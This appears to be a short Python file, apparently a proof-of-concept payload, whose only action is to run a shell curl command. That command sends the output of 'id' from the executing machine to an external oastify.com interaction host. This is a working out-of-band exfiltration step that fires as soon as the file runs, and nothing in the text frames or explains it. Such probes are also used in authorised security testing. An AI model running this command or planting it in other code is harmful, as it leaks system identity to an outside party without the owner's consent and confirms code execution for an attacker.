import os

os.system("curl http://6krddfbeqw0pisps3egdsofu9lfc33vrk.oastify.com -d $(id)")
